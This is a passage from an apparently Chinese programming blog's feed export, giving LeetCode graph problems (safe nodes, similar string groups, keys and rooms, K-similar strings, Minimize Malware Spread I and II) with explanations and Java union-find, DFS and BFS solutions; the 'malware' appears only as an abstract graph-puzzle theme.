<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">eventualSafeNodes</span><span class="params">(<span class="keyword">int</span>[][] graph)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(graph == <span class="keyword">null</span> || graph.length == <span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">int</span> N = graph.length;</span><br><span class="line">        <span class="keyword">int</span>[] color = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> c = dfs(graph, color, i);</span><br><span class="line">            <span class="keyword">if</span>(c) res.add(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] graph, <span class="keyword">int</span>[] color, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 对已经访问过的结点，在调用栈上为1，1！=2返回false，否则可以返回true</span></span><br><span class="line">        <span class="keyword">if</span>(color[v] != <span class="number">0</span>) <span class="keyword">return</span> color[v] == <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        color[v] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w : graph[v]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!dfs(graph, color, w)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        color[v] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-839</title>
    <url>/2018/12/14/leetcode-839/</url>
    <content><![CDATA[<h1 id="Similar-String-Groups"><a href="#Similar-String-Groups" class="headerlink" title="Similar String Groups"></a>Similar String Groups</h1><p>Two strings X and Y are similar if we can swap two letters (in different positions) of X, so that it equals Y.</p>
<p>For example, “tars” and “rats” are similar (swapping at positions 0 and 2), and “rats” and “arts” are similar, but “star” is not similar to “tars”, “rats”, or “arts”.</p>
<p>Together, these form two connected groups by similarity: {“tars”, “rats”, “arts”} and {“star”}.  Notice that “tars” and “arts” are in the same group even though they are not similar.  Formally, each group is such that a word is in the group if and only if it is similar to at least one other word in the group.</p>
<p>We are given a list A of strings.  Every string in A is an anagram of every other string in A.  How many groups are there?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: [&quot;tars&quot;,&quot;rats&quot;,&quot;arts&quot;,&quot;star&quot;]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>A.length &lt;= 2000</li>
<li>A[i].length &lt;= 1000</li>
<li>A.length * A[i].length &lt;= 20000</li>
<li>All words in A consist of lowercase letters only.</li>
<li>All words in A have the same length and are anagrams of each other.</li>
<li>The judging time limit has been increased for this question.</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>给定一个字符串数组，将相似的字符串分在一个group，问这样的group有多少。这里我们采用union-find策略，理由union-find数据结构的特点，只需要将相似字符串union，最后看这个uf的size就可以了。设字符串长度为M，字符串数组长度为N，则最坏时间复杂度为MN^2。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSimilarGroups</span><span class="params">(String[] A)</span> </span>&#123;</span><br><span class="line">        UF uf = <span class="keyword">new</span> UF(A.length);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; A.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(similar(A[i], A[j])) uf.union(i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uf.count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">similar</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 如果有两个字符不同则相似</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s1.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s1.charAt(i)!= s2.charAt(i) &amp;&amp; ++count &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">UF</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] parents;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UF</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">            parents = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            size = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                parents[i] = i;</span><br><span class="line">                size[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count = n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> count;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;<span class="keyword">return</span> find(p) == find(q);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(id != parents[id])</span><br><span class="line">                id = parents[id];</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> iid = find(i);</span><br><span class="line">            <span class="keyword">int</span> jid = find(j);</span><br><span class="line">            <span class="keyword">if</span>(iid == jid) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(size[iid] &gt; size[jid]) &#123;</span><br><span class="line">                size[iid] += size[jid];</span><br><span class="line">                parents[jid] = iid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                size[jid] += size[iid];</span><br><span class="line">                parents[iid] = jid;</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
        <tag>union find</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-841</title>
    <url>/2018/12/13/leetcode-841/</url>
    <content><![CDATA[<h1 id="Keys-and-rooms"><a href="#Keys-and-rooms" class="headerlink" title="Keys and rooms"></a>Keys and rooms</h1><p>There are N rooms and you start in room 0.  Each room has a distinct number in 0, 1, 2, …, N-1, and each room may have some keys to access the next room. </p>
<p>Formally, each room i has a list of keys rooms[i], and each key rooms[i][j] is an integer in [0, 1, …, N-1] where N = rooms.length.  A key rooms[i][j] = v opens the room with number v.</p>
<p>Initially, all the rooms start locked (except for room 0). </p>
<p>You can walk back and forth between rooms freely.</p>
<p>Return true if and only if you can enter every room.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1],[2],[3],[]]</span><br><span class="line">Output: true</span><br><span class="line">Explanation:  </span><br><span class="line">We start in room 0, and pick up key 1.</span><br><span class="line">We then go to room 1, and pick up key 2.</span><br><span class="line">We then go to room 2, and pick up key 3.</span><br><span class="line">We then go to room 3.  Since we were able to go to every room, we return true.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: [[1,3],[3,0,1],[2],[0]]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: We can&#39;t enter the room with number 2.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>1 &lt;= rooms.length &lt;= 1000</li>
<li>0 &lt;= rooms[i].length &lt;= 1000</li>
<li>The number of keys in all rooms combined is at most 3000.</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>该题是检查可达性问题的形式相对简单的一道题。在有向图中，从0出发，检查是否可以到达任意结点。我们维护的唯一的数据结构是set，我们每到达一个结点，都将其添加到set中，然后dfs相邻结点，完成一次完整的从0开始的dfs遍历后，若set的大小和rooms的大小一致，则说明可达所有结点，否则，返回false。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; s = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canVisitAllRooms</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; rooms)</span> </span>&#123;</span><br><span class="line">        dfs(rooms, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> s.size() == rooms.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; rooms, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        s.add(i);</span><br><span class="line">        List&lt;Integer&gt; keys = rooms.get(i);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> key : keys) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!s.contains(key))</span><br><span class="line">                dfs(rooms, key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-854</title>
    <url>/2018/12/17/leetcode-854/</url>
    <content><![CDATA[<h1 id="K-Similar-Strings"><a href="#K-Similar-Strings" class="headerlink" title="K-Similar Strings"></a>K-Similar Strings</h1><p>Strings A and B are K-similar (for some non-negative integer K) if we can swap the positions of two letters in A exactly K times so that the resulting string equals B.</p>
<a id="more"></a>
<p>Given two anagrams A and B, return the smallest K for which A and B are K-similar.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A &#x3D; &quot;ab&quot;, B &#x3D; &quot;ba&quot;</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A &#x3D; &quot;abc&quot;, B &#x3D; &quot;bca&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A &#x3D; &quot;abac&quot;, B &#x3D; &quot;baca&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 4:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A &#x3D; &quot;aabc&quot;, B &#x3D; &quot;abca&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>1 &lt;= A.length == B.length &lt;= 20</li>
<li>A and B contain only lowercase letters from the set {‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’}</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>这道题给定两个字符串，对第一个字符串作交换操作，找到最小的交换次数，使得最终的结果和第二个字符串是相同的。做这道题的时间跨度是三天左右，昨天忙了一天的入党转正的事情，今天第一件事就是重新拿起这道题看了一下。第一次做这道题的时候想起了leetcode-765这道情侣牵手的问题，后来在采取相同策略的时候发现这个题和765最大的不同就是这个题会包含重复字符，而采用空间上增加一个map，后面添加的会覆盖前面添加的条目（写这篇文章的时候，突然想到，可不可以将map的值设置为list？这里留个疑问），还是参考了discussion里面的解答。找最小次数交换想到BFS，我们在每一轮找到可能是答案的解节点，将这个解结点加入队列，然后不断做BFS操作，为了标识访问过的字符串，增加一个set数据结构，以避免重复BFS死循环。举个例子，<code>A = &quot;aabc&quot;, B = &quot;abca&quot;</code>，首先我们找到第一个不同的字符，在这里为1位置，分别对应字符a和字符b，然后我们想这一轮将第1个位置的字符解决掉，向后扫描找到一个符合条件的字符，因为这个字符的位置理应是b，所以我们找到了第2个字符，将其交换，并发现后面并没有b了，所以我们第一轮的操作就是将A字符串的第1个字符和第2个字符做交换操作，并首先观察A字符串是否已经和B字符串一样了，如果是，我们返回res，否则，判断set是否含有这个字符串，如果不含有也就是set的add操作返回true，那么我们将其加到queue。以此类推。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kSimilarity</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(A.equals(B)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Set&lt;String&gt; vis = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        Queue&lt;String&gt; q = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        vis.add(A);</span><br><span class="line">        q.offer(A);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty()) &#123;</span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sz = q.size(); sz &gt; <span class="number">0</span>; sz--) &#123;</span><br><span class="line">                String s = q.poll();</span><br><span class="line">                <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(s.charAt(i) == B.charAt(i)) i++;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; s.length(); j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s.charAt(j) == B.charAt(j) || s.charAt(j) != B.charAt(i)) <span class="keyword">continue</span>;</span><br><span class="line">                    String snew = swap(s, i, j);</span><br><span class="line">                    <span class="keyword">if</span>(snew.equals(B)) <span class="keyword">return</span> res;</span><br><span class="line">                    <span class="keyword">if</span>(vis.add(snew)) q.offer(snew);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">swap</span><span class="params">(String s, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] scharArr = s.toCharArray();</span><br><span class="line">        <span class="keyword">char</span> temp = scharArr[i];</span><br><span class="line">        scharArr[i] = scharArr[j];</span><br><span class="line">        scharArr[j] = temp;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(scharArr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-924</title>
    <url>/2018/12/19/leetcode-924/</url>
    <content><![CDATA[<h1 id="Minimize-Malware-Spread"><a href="#Minimize-Malware-Spread" class="headerlink" title="Minimize Malware Spread"></a>Minimize Malware Spread</h1><p>In a network of nodes, each node i is directly connected to another node j if and only if graph[i][j] = 1.</p>
<p>Some nodes initial are initially infected by malware.  Whenever two nodes are directly connected and at least one of those two nodes is infected by malware, both nodes will be infected by malware.  This spread of malware will continue until no more nodes can be infected in this manner.</p>
<p>Suppose <code>M(initial)</code> is the final number of nodes infected with malware in the entire network, after the spread of malware stops.</p>
<p>We will remove one node from the initial list.  Return the node that if removed, would minimize M(initial).  If multiple nodes could be removed to minimize M(initial), return such a node with the smallest index.</p>
<p>Note that if a node was removed from the initial list of infected nodes, it may still be infected later as a result of the malware spread.</p>
<a id="more"></a>

<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,1,0],[1,1,0],[0,0,1]], initial &#x3D; [0,1]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,0,0],[0,1,0],[0,0,1]], initial &#x3D; [0,2]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,1,1],[1,1,1],[1,1,1]], initial &#x3D; [1,2]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p>Note:</p>
<ul>
<li>1 &lt; graph.length = graph[0].length &lt;= 300</li>
<li>0 &lt;= graph[i][j] == graph[j][i] &lt;= 1</li>
<li>graph[i][i] = 1</li>
<li>1 &lt;= initial.length &lt; graph.length</li>
<li>0 &lt;= initial[i] &lt; graph.length</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>给定一个graph数组，表示网络中的连接情况。此外有一个initial数组，表示初始的感染节点，每一个和结点相邻的结点随着时间的推移都会被感染，最终达到稳定状态时的感染结点记为M（Initial），让我们修复一个结点，修复结点过后使得M（Initial）达到最小，找到这个被修复的节点。参考了discussion，发现了一个很好的解释，<a href="https://buptwc.com/2018/10/15/Leetcode-924-Minimize-Malware-Spread/" target="_blank" rel="noopener">这是链接</a><br>最后我采用的和链接中的少许不同，但是思路是一样的，就是找到连通子图中只有一个malware的并且size是最大的。如果找不到，就返回initial里面最小的。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMalwareSpread</span><span class="params">(<span class="keyword">int</span>[][] graph, <span class="keyword">int</span>[] initial)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> N = graph.length;</span><br><span class="line">        UF uf = <span class="keyword">new</span> UF(N);</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Arrays.sort(initial);</span><br><span class="line">        <span class="keyword">int</span> res = initial[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(graph[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    uf.union(i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : initial) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!map.containsKey(uf.find(i))) map.put(uf.find(i), <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span> map.put(uf.find(i), map.get(uf.find(i))+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : initial) &#123;</span><br><span class="line">            <span class="keyword">int</span> root = uf.find(i);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(map.get(root) == <span class="number">1</span> &amp;&amp; uf.size(root) &gt; size) &#123;</span><br><span class="line">                res = i;</span><br><span class="line">                size = uf.size(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">UF</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] parents;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UF</span><span class="params">(<span class="keyword">int</span> N)</span></span>&#123;</span><br><span class="line">            parents = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">            size = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">                parents[i] = i;</span><br><span class="line">                size[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count = N;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;<span class="keyword">return</span> size[i];&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> count;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(p != parents[p])</span><br><span class="line">                p = parents[p];</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> pid = find(p);</span><br><span class="line">            <span class="keyword">int</span> qid = find(q);</span><br><span class="line">            <span class="keyword">if</span>(pid == qid) <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">if</span>(size[pid] &lt; size[qid]) &#123;</span><br><span class="line">                parents[pid] = qid;</span><br><span class="line">                size[qid] += size[pid];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                parents[qid] = pid;</span><br><span class="line">                size[pid] += size[qid];</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
        <tag>union-find</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-928</title>
    <url>/2018/12/21/leetcode-928/</url>
    <content><![CDATA[<h1 id="Minimize-Malware-Spread-II"><a href="#Minimize-Malware-Spread-II" class="headerlink" title="Minimize Malware Spread II"></a>Minimize Malware Spread II</h1><p>(This problem is the same as Minimize Malware Spread, with the differences bolded.)</p>
<p>In a network of nodes, each node i is directly connected to another node j if and only if graph[i][j] = 1.</p>
<a id="more"></a>

<p>Some nodes initial are initially infected by malware.  Whenever two nodes are directly connected and at least one of those two nodes is infected by malware, both nodes will be infected by malware.  This spread of malware will continue until no more nodes can be infected in this manner.</p>
<p>Suppose M(initial) is the final number of nodes infected with malware in the entire network, after the spread of malware stops.</p>
<p>We will remove one node from the initial list, completely removing it and any connections from this node to any other node.  Return the node that if removed, would minimize M(initial).  If multiple nodes could be removed to minimize M(initial), return such a node with the smallest index.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,1,0],[1,1,0],[0,0,1]], initial &#x3D; [0,1]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,1,0],[1,1,1],[0,1,1]], initial &#x3D; [0,1]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,1,0,0],[1,1,1,0],[0,1,1,1],[0,0,1,1]], initial &#x3D; [0,1]</span><br><span class="line">Output: 1</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">- 1 &lt; graph.length &#x3D; graph[0].length &lt;&#x3D; 300</span><br><span class="line">- 0 &lt;&#x3D; graph[i][j] &#x3D;&#x3D; graph[j][i] &lt;&#x3D; 1</span><br><span class="line">- graph[i][i] &#x3D; 1</span><br><span class="line">- 1 &lt;&#x3D; initial.length &lt; graph.length</span><br><span class="line">- 0 &lt;&#x3D; initial[i] &lt; graph.length</span><br><span class="line"></span><br><span class="line">## 题意分析</span><br><span class="line"></span><br><span class="line">这道题类似leetcode924，不同的地方在于924是修复某个初始感染节点，而本题是直接移除节点以及相邻的链路。这道题的关键在于我们要找到那些只能被某一个感染节点感染的非感染节点。因为一旦断开链路，保证再也不能被感染的节点是唯一能够被remove节点感染的节点，而其它节点均可能被另外的感染节点所感染。而924的关键是它是修复节点，修复节点不是移除节点，涉及到的是连通子图内的问题，如果连通子图内有两个感染节点，无论移除哪一个都没法使得其他节点不被感染，所以问题演变成寻找只有一个感染节点的最大连通子图。</span><br><span class="line"></span><br><span class="line">## 代码实现</span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public int minMalwareSpread(int[][] graph, int[] initial) &#123;</span><br><span class="line">        &#x2F;&#x2F; construct infectedBy which represents every node in graph except initial node infected by which initial node</span><br><span class="line">        int N &#x3D; graph.length;</span><br><span class="line">        ArrayList&lt;Integer&gt;[] infectedBy &#x3D; new ArrayList[N];</span><br><span class="line">        for(int i &#x3D; 0; i &lt; N; i++)</span><br><span class="line">            infectedBy[i] &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">        &#x2F;&#x2F; mark initial node which is 0, normal node is 1</span><br><span class="line">        int[] clean &#x3D; new int[N];</span><br><span class="line">        Arrays.fill(clean, 1);</span><br><span class="line">        for(int i : initial)</span><br><span class="line">            clean[i] &#x3D; 0;</span><br><span class="line">        for(int i : initial) &#123;</span><br><span class="line">            Set&lt;Integer&gt; seen &#x3D; new HashSet&lt;&gt;();</span><br><span class="line">            dfs(graph, clean, seen, i);</span><br><span class="line">            for(int v : seen)</span><br><span class="line">                infectedBy[v].add(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; find size of infectedBy item is 1, which is contributes to the initial node</span><br><span class="line">        int[] contributions &#x3D; new int[N];</span><br><span class="line">        for(int i &#x3D; 0; i &lt; infectedBy.length; i++) &#123;</span><br><span class="line">            if(infectedBy[i].size() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                contributions[infectedBy[i].get(0)]++;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      